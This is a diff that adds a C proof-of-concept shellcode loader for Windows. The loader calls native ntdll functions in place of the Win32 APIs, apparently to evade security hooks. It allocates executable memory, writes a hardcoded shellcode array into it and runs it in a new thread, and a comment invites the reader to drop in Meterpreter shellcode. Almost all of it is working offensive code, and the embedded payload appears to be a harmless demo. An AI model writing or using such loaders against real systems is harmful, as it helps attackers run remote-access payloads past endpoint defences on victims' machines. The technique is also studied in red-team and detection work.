@@ -1,0 +1,45 @@
+// In this POC, the four Win32 APIs from the Win32-API loader 
+// are replaced with the corresponding native functions.
+
+#include <stdio.h>
+#include <windows.h>
+
+// Define typedefs for function pointers to the native API functions we'll be using.
+// These match the function signatures of the respective functions.
+typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+
+
+int main() {
+    // Insert Meterpreter shellcode here.
+    unsigned char code[] = "\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8\x5e\x00\x00\x00\x5a\x89\xc5\x55\x52\x8d\xb2\x0d\x01\x00\x00\x8d\xba\x17\x01\x00\x00\xe8\x7e\x00\x00\x00\x5a\x5d\x52\x8d\x8a\x29\x01\x00\x00\x51\xff\x92\x1b\x01\x00\x00\x89\xc5\x5a\x52\x8d\xb2\x1f\x01\x00\x00\x8d\xba\x25\x01\x00\x00\xe8\x59\x00\x00\x00\x5a\x52\x6a\x00\x8d\x8a\x39\x01\x00\x00\x51\x8d\x8a\x34\x01\x00\x00\x51\x6a\x00\xff\x92\x25\x01\x00\x00\x5a\x6a\x00\xff\x92\x17\x01\x00\x00\xfc\x31\xff\x64\x8b\x3d\x30\x00\x00\x00\x8b\x7f\x0c\x8b\x7f\x14\x8b\x77\x28\x31\xd2\x66\xad\x84\xc0\x74\x11\x3c\x41\x72\x06\x3c\x5a\x77\x02\x0c\x20\xc1\xc2\x07\x30\xc2\xeb\xe9\x39\xda\x8b\x47\x10\x8b\x3f\x75\xdb\xc3\x89\xea\x03\x52\x3c\x8b\x52\x78\x01\xea\x8b\x5a\x20\x01\xeb\x31\xc9\x57\x56\x8b\x36\x8b\x3b\x01\xef\x52\x31\xd2\xc1\xc2\x07\x32\x17\x47\x80\x3f\x00\x75\xf5\x92\x5a\x39\xf0\x74\x0c\x83\xc3\x04\x41\x39\x4a\x18\x75\xdf\x5e\x5f\xc3\x5e\x5f\xad\x56\x53\x89\xeb\x89\xde\x03\x5a\x24\x8d\x04\x4b\x0f\xb7\x00\x8d\x04\x86\x03\x42\x1c\x8b\x00\x01\xf0\xab\x5b\x5e\x83\xc3\x04\x41\x81\x3e\xff\xff\x00\x00\x75\xad\xc3\x19\x2b\x90\x95\x26\x80\xac\xc8\xff\xff\x01\x00\x00\x00\x02\x00\x00\x00\x0d\x68\xbc\xab\xff\xff\x01\x00\x00\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x65\x72\x65\x00\x61\x62\x63\x00";
+
+    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
+    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
+    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
+    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
+
+
+    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
+    // 'exec' will hold the base address of the allocated memory region.
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region.
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Execute the shellcode in memory using a new thread.
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+
+    // Wait for the thread to finish executing.
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    return 0;
+}
